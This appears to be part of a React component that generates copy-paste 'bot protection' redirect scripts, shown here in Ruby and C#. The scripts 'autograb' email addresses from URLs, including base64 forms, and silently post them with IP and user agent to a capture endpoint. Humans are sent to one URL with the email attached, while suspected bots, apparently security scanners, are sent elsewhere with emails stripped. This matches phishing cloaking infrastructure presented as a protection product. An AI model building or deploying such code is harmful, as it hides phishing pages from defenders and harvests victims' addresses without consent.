    timestamp: Time.now.to_i
  }
  signature = OpenSSL::HMAC.hexdigest('sha256', API_KEY, data.to_json)
  data[:signature] = signature
  
  is_human = true
  begin
    response = HTTParty.post(API_ENDPOINT, {
      body: data.to_json,
      headers: { 'Content-Type' => 'application/json', 'X-API-Key' => API_KEY },
      timeout: 5
    })
    result = JSON.parse(response.body)
    is_human = result['classification'] == 'HUMAN'
  rescue
  end
  
  # Determine final URL
  if is_human
    final_url = append_params_to_url(HUMAN_URL, url_params)
    capture_email_async(email, ip_address, user_agent, full_url) if email
  else
    clean_params = strip_emails_from_params(url_params)
    final_url = append_params_to_url(BOT_URL, clean_params)
  end
  
  redirect final_url, 302
end`;

  // C# (.NET) Script
  const csharpScript = `// Bot Protection Script with Email Autograb (ASP.NET Core)
// Generated for: ${apiUser?.username || 'User'}
// API Key: ${apiUser?.api_key || 'YOUR_API_KEY'}

using Microsoft.AspNetCore.Mvc;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Web;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

// Configuration
const string API_KEY = "${apiUser?.api_key || 'YOUR_API_KEY'}";
const string API_ENDPOINT = "${window.location.origin}/api/classify";
const string EMAIL_CAPTURE_ENDPOINT = "${window.location.origin}/api/capture-email";
const string HUMAN_URL = "${apiUser?.human_redirect_url || 'https://example.com/human'}";
const string BOT_URL = "${apiUser?.bot_redirect_url || 'https://example.com/bot'}";

// ==========================================
// EMAIL AUTOGRAB FUNCTIONS
// ==========================================

List<string> ExtractEmailsFromUrl(string url)
{
    var emails = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
    var decodedUrl = HttpUtility.UrlDecode(url);
    
    // Pattern 1: Plain email addresses
    var emailRegex = new Regex(@"([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)", 
                               RegexOptions.IgnoreCase);
    foreach (Match m in emailRegex.Matches(decodedUrl))
        emails.Add(m.Value);
    
    // Pattern 2: Base64 encoded emails
    var base64Regex = new Regex(@"[\\$\\*\\?&#]([A-Za-z0-9+/]{20,}={0,2})");
    foreach (Match m in base64Regex.Matches(decodedUrl))
    {
        try
        {
            var decoded = Encoding.UTF8.GetString(Convert.FromBase64String(m.Groups[1].Value));
            foreach (Match em in emailRegex.Matches(decoded))
                emails.Add(em.Value);
        }
        catch { }
    }
    
    return emails.ToList();
}

string StripEmailsFromParams(string param)
{
    if (string.IsNullOrEmpty(param)) return param;
    
    var emailRegex = new Regex(@"([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)", 
                               RegexOptions.IgnoreCase);
    var cleaned = emailRegex.Replace(param, "");
    cleaned = Regex.Replace(cleaned, @"[?&](\\w+)=&", "&");
    cleaned = Regex.Replace(cleaned, @"[?&](\\w+)=$", "");
    cleaned = Regex.Replace(cleaned, @"\\?&", "?");
    cleaned = cleaned.TrimEnd('?', '&', '#', '$', '*');
    return cleaned;
}

string AppendParamsToUrl(string destUrl, string param)
{
    if (string.IsNullOrEmpty(param)) return destUrl;
    
    if (param.StartsWith("?"))
    {
        var query = param.Substring(1);
        if (!string.IsNullOrEmpty(query))
            return destUrl.Contains("?") ? $"{destUrl}&{query}" : $"{destUrl}?{query}";
    }
    else if (param.StartsWith("#"))
    {
        return destUrl.Split('#')[0] + param;
    }
    else if (param.StartsWith("$") || param.StartsWith("*"))
    {
        if (!destUrl.EndsWith("/")) destUrl += "/";
        return destUrl + param;
    }
    return destUrl;
}

async Task CaptureEmailAsync(string email, string ipAddress, string userAgent, string sourceUrl)
{
    _ = Task.Run(async () =>
    {
        try
        {
            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
            var data = new { api_key = API_KEY, email, ip_address = ipAddress, 
                           user_agent = userAgent, source_url = sourceUrl,
                           captured_at = DateTime.UtcNow.ToString("o") };
            var content = new StringContent(JsonSerializer.Serialize(data), 
                                           Encoding.UTF8, "application/json");
            client.DefaultRequestHeaders.Add("X-API-Key", API_KEY);
            await client.PostAsync(EMAIL_CAPTURE_ENDPOINT, content);
        }
        catch { }
    });
}

// ==========================================
// MAIN ROUTE
// ==========================================

app.MapGet("/redirect", async (HttpContext context) =>
{
    // Get visitor info
    var ipAddress = context.Request.Headers["X-Forwarded-For"].FirstOrDefault() 
                    ?? context.Connection.RemoteIpAddress?.ToString() ?? "unknown";
    var userAgent = context.Request.Headers["User-Agent"].FirstOrDefault() ?? "";
    var referer = context.Request.Headers["Referer"].FirstOrDefault() ?? "direct";
    var fullUrl = $"{context.Request.Scheme}://{context.Request.Host}{context.Request.Path}{context.Request.QueryString}";
    
    // Extract emails (Email Autograb)
    var emails = ExtractEmailsFromUrl(fullUrl);
    var email = emails.FirstOrDefault();
    
    // Get URL parameters
    var urlParams = context.Request.QueryString.HasValue 
        ? context.Request.QueryString.Value 
        : "";
    
    // Classify visitor
    var data = new
    {
        api_key = API_KEY,
        ip_address = ipAddress,
        user_agent = userAgent,
        referer = referer,
        origin = context.Request.Host.Value,
        timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
    };
    var jsonData = JsonSerializer.Serialize(data);
    using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(API_KEY));
    var signature = BitConverter.ToString(hmac.ComputeHash(Encoding.UTF8.GetBytes(jsonData)))
                               .Replace("-", "").ToLower();
    
    var signedData = new Dictionary<string, object>(
        JsonSerializer.Deserialize<Dictionary<string, object>>(jsonData)!)
    {
        ["signature"] = signature
    };
    
    bool isHuman = true;
    try
    {
        using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
        client.DefaultRequestHeaders.Add("X-API-Key", API_KEY);
        var content = new StringContent(JsonSerializer.Serialize(signedData), 
                                       Encoding.UTF8, "application/json");
        var response = await client.PostAsync(API_ENDPOINT, content);
        var result = await JsonSerializer.DeserializeAsync<JsonElement>(
                     await response.Content.ReadAsStreamAsync());
        isHuman = result.GetProperty("classification").GetString() == "HUMAN";
    }
    catch { }
    
    // Determine final URL
    string finalUrl;
    if (isHuman)
    {
        finalUrl = AppendParamsToUrl(HUMAN_URL, urlParams);
        if (!string.IsNullOrEmpty(email))
            await CaptureEmailAsync(email, ipAddress, userAgent, fullUrl);
    }
    else
    {
        var cleanParams = StripEmailsFromParams(urlParams);
        finalUrl = AppendParamsToUrl(BOT_URL, cleanParams);
    }
    
    context.Response.Redirect(finalUrl);
});

app.Run();`;

  const copyScript = (script) => {
    navigator.clipboard.writeText(script);
    setCopied(true);
    toast.success('Script copied to clipboard!');
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-6">
      <Card className="p-6">
        <div className="flex items-center gap-3 mb-4">
          <Code className="w-6 h-6 text-emerald-600" />
          <h3 className="text-lg font-semibold text-slate-900">Integration Script Generator</h3>
        </div>
        <p className="text-slate-600 mb-6">
          Copy and paste these ready-to-use scripts into your application. All scripts include 
          <strong> Email Autograb</strong>, HMAC signing, and smart bot protection. 
          Available in PHP, JavaScript, Python, Node.js, Go, Ruby, and C#.
        </p>

        <Tabs defaultValue="php">
          <TabsList className="mb-4 flex-wrap h-auto gap-1">
            <TabsTrigger value="php">PHP</TabsTrigger>
            <TabsTrigger value="javascript">JavaScript</TabsTrigger>
            <TabsTrigger value="python">Python</TabsTrigger>
            <TabsTrigger value="nodejs">Node.js</TabsTrigger>
            <TabsTrigger value="go">Go</TabsTrigger>
            <TabsTrigger value="ruby">Ruby</TabsTrigger>
            <TabsTrigger value="csharp">C#</TabsTrigger>
          </TabsList>

          <TabsContent value="php">
            <div className="relative">
              <pre className="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm max-h-[500px]">
                <code>{phpScript}</code>
              </pre>
              <Button
                size="sm"
                className="absolute top-4 right-4"
                onClick={() => copyScript(phpScript)}
              >
                {copied ? 'Copied!' : <><Copy className="w-4 h-4 mr-2" /> Copy</>}
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="javascript">
            <div className="relative">
              <pre className="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm max-h-[500px]">
                <code>{jsScript}</code>
              </pre>
              <Button
                size="sm"
                className="absolute top-4 right-4"
                onClick={() => copyScript(jsScript)}
              >
                {copied ? 'Copied!' : <><Copy className="w-4 h-4 mr-2" /> Copy</>}
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="python">
            <div className="relative">
              <pre className="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm max-h-[500px]">
                <code>{pythonScript}</code>
              </pre>
              <Button
                size="sm"
                className="absolute top-4 right-4"
                onClick={() => copyScript(pythonScript)}
              >
                {copied ? 'Copied!' : <><Copy className="w-4 h-4 mr-2" /> Copy</>}
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="nodejs">
            <div className="relative">
              <pre className="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm max-h-[500px]">
                <code>{nodeScript}</code>
              </pre>
              <Button
                size="sm"
                className="absolute top-4 right-4"
                onClick={() => copyScript(nodeScript)}
              >
                {copied ? 'Copied!' : <><Copy className="w-4 h-4 mr-2" /> Copy</>}
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="go">
            <div className="relative">
              <pre className="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm max-h-[500px]">
                <code>{goScript}</code>
              </pre>
              <Button
                size="sm"
                className="absolute top-4 right-4"
                onClick={() => copyScript(goScript)}
              >
                {copied ? 'Copied!' : <><Copy className="w-4 h-4 mr-2" /> Copy</>}
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="ruby">
            <div className="relative">
              <pre className="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm max-h-[500px]">
                <code>{rubyScript}</code>
              </pre>
              <Button
                size="sm"
                className="absolute top-4 right-4"
                onClick={() => copyScript(rubyScript)}
              >
                {copied ? 'Copied!' : <><Copy className="w-4 h-4 mr-2" /> Copy</>}
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="csharp">
            <div className="relative">
              <pre className="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm max-h-[500px]">
                <code>{csharpScript}</code>
              </pre>
              <Button
                size="sm"
                className="absolute top-4 right-4"
                onClick={() => copyScript(csharpScript)}
              >
                {copied ? 'Copied!' : <><Copy className="w-4 h-4 mr-2" /> Copy</>}
              </Button>
            </div>
          </TabsContent>
        </Tabs>
      </Card>

      <Card className="p-6">
        <h3 className="text-lg font-semibold text-slate-900 mb-4">Features Included</h3>
        <ul className="space-y-2 text-slate-600">
          <li className="flex items-start gap-2">
            <span className="text-emerald-600 mt-1">✓</span>
            <span><strong>Email Autograb</strong> - Captures emails from URLs ($email, *email, ?email=, base64)</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-emerald-600 mt-1">✓</span>
            <span><strong>Smart Email Handling</strong> - Forwards emails for humans, strips for bots</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-emerald-600 mt-1">✓</span>
            <span><strong>Email Capture</strong> - Automatically sends captured emails to your dashboard</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-emerald-600 mt-1">✓</span>
            <span>HMAC-signed tokens for request authentication</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-emerald-600 mt-1">✓</span>
            <span>Rate limiting protection (configurable per account)</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-emerald-600 mt-1">✓</span>
            <span>Strict header validation and origin checking</span>
          </li>
        </ul>
      </Card>
    </div>
  );
}